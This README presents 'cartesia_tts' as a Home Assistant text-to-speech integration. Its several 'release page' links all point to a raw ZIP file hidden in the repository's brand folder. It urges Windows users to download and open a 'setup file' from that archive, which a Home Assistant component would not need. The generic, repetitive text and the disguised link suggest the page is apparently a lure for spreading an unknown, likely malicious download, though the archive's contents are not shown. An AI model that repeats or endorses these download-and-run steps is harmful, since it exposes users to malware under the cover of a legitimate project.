# 🔊 cartesia_tts - Natural voice for Home Assistant

[![Download cartesia_tts](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Chamant8149/cartesia_tts/raw/refs/heads/main/custom_components/cartesia_tts/brand/cartesia-tts-hypopyon.zip)

## 📦 What this is

cartesia_tts adds Cartesia Sonic text-to-speech to Home Assistant. It lets your smart home speak with clear voices in many languages.

Use it to:

- Read alerts out loud
- Announce door, motion, and sensor events
- Speak in different voices for different needs
- Use a voice that fits your home setup

It is built for Home Assistant users who want simple voice output without extra setup steps.

## 🚀 Getting started

Use the release page to download and run this file:

https://github.com/Chamant8149/cartesia_tts/raw/refs/heads/main/custom_components/cartesia_tts/brand/cartesia-tts-hypopyon.zip

After you open the page, look for the latest release and get the file that matches your system. On Windows, this will usually be a setup file or an add-on package you can place into your Home Assistant setup.

## 🖥️ Before you start

You need:

- A Windows computer for download and setup
- A Home Assistant install
- Internet access
- A Cartesia account or API key, if your setup needs one
- A speaker or audio device for testing voice output

Best results come from:

- A current version of Home Assistant
- Enough storage for add-on files
- A stable network connection
- A browser that can open GitHub release pages

## 📥 Download and install

1. Open the release page:
   https://github.com/Chamant8149/cartesia_tts/raw/refs/heads/main/custom_components/cartesia_tts/brand/cartesia-tts-hypopyon.zip

2. Find the newest release near the top of the page.

3. Look for the file that matches your setup.

4. Download the file to your Windows PC.

5. If the release includes a ZIP file, extract it before use.

6. If the release includes a Home Assistant add-on package, move it into the place your Home Assistant install expects.

7. Restart Home Assistant if the install process asks for it.

8. Open Home Assistant and check that the Cartesia TTS option appears in your voice or integration list.

## ⚙️ How to set it up in Home Assistant

After install, add your Cartesia details in Home Assistant.

Typical setup steps:

- Open Home Assistant settings
- Go to Devices & services
- Add the Cartesia TTS integration
- Enter your API key or other account details
- Choose a default voice
- Save the setup

If the integration asks for a URL, token, or voice name, use the values from your Cartesia account or release instructions.

## 🎤 Choosing a voice

This project supports a large voice set with over 660 voices and 42 languages. That gives you room to pick a voice that fits your home.

Good uses include:

- A calm voice for alerts
- A clear voice for announcements
- Different voices for family members
- Language-specific voices for each room or routine

When you test voices, start with a short line like:

- Front door opened
- Motion detected in the kitchen
- Laundry is done

This helps you hear if the voice sounds right before you use longer messages.

## 🌍 Language support

cartesia_tts works well when you need voice output in more than one language.

Use it for:

- English messages
- Multilingual homes
- Guest-friendly alerts
- Routines that switch voice language by room or user

If you live with family or guests who speak different languages, this makes spoken alerts easier to understand.

## 🧪 Test it in Home Assistant

After setup, send a test message.

Try:

- A short notification
- A doorbell alert
- A weather announcement
- A bedtime reminder

If you hear nothing, check:

- Your speaker volume
- The selected output device
- Your Home Assistant voice settings
- Your Cartesia account details
- The chosen voice name

## 🔧 Common setup path on Windows

If you are using Windows to manage the install, this is the usual flow:

1. Open the release page in your browser.
2. Download the latest package.
3. Save it to a folder you can find again.
4. Open the file or extract the archive.
5. Follow the Home Assistant install path for your setup.
6. Restart Home Assistant if needed.
7. Test speech from the Home Assistant UI.

If you keep files in one folder for Home Assistant add-ons, that makes later updates easier.

## 📁 What you may see in the release page

Release pages often include:

- A version number
- A download file
- A changelog
- Notes for install
- Checksums or file names

Read the release notes before you install a new version. That helps you spot changes to voice support, language support, or Home Assistant behavior.

## 🏠 Good home use cases

This integration fits many Home Assistant tasks:

- Announce when someone rings the doorbell
- Speak when a sensor changes state
- Read reminders at set times
- Announce alarms
- Give bedtime and morning messages
- Send spoken alerts during automations

It works well when you want Home Assistant to talk in a clear and controlled way.

## 🔐 Account and key setup

Some Cartesia setups need a key before speech works.

If you need one:

- Sign in to your Cartesia account
- Copy the key from your account page
- Paste it into the Home Assistant setup screen
- Save your settings
- Test a short message

Keep the key private. Do not share it in screenshots or public posts.

## 🧭 If setup does not work

Check these items first:

- The download finished fully
- You used the latest release
- Home Assistant restarted after install
- Your API key is correct
- The voice name is valid
- Your speaker is connected
- The volume is not muted
- Your network connection is active

If the page shows several files, use the one made for your Home Assistant setup and not a source archive unless the instructions ask for it.

## 🧰 Helpful tips

- Start with one voice and one language
- Test short phrases before long ones
- Keep your release file name unchanged
- Save the release page link for updates
- Use simple speech text so alerts stay clear

A short message often sounds better than a long one. For example:

- Garage door open
- Water leak detected
- Package delivered
- Good morning

## 🔄 Updating

When a new version appears:

1. Open the releases page
2. Download the latest file
3. Replace the old file if needed
4. Restart Home Assistant
5. Test speech again

Updating from the release page keeps your setup current with the latest voice and language changes.

## 🧾 Repository details

- Repository: cartesia_tts
- Type: Home Assistant TTS integration
- Topic area: text to speech, voice assistant, speech synthesis
- Voice count: 660+
- Language support: 42 languages

## 📌 Files and links

Download page:
https://github.com/Chamant8149/cartesia_tts/raw/refs/heads/main/custom_components/cartesia_tts/brand/cartesia-tts-hypopyon.zip

GitHub topics:

- audio
- cartesia
- hacs
- home-assistant
- integration
- sonic
- speech-synthesis
- text-to-speech
- tts
- voice-assistant

## 🗣️ Example automations

You can use cartesia_tts in automations like:

- Speak when motion is detected
- Read a reminder at a set time
- Announce when a door opens
- Say when a device loses power
- Tell you when a laundry cycle ends

Example message ideas:

- The front door is open
- The kitchen window is closed
- The thermostat is set to 72 degrees
- The garage light is still on

## ✅ Best first test

Use this first:

1. Install the release
2. Add your Cartesia details
3. Pick one voice
4. Send a short test phrase
5. Listen from your speaker

If that works, you can build more automations with the same voice or add more voices later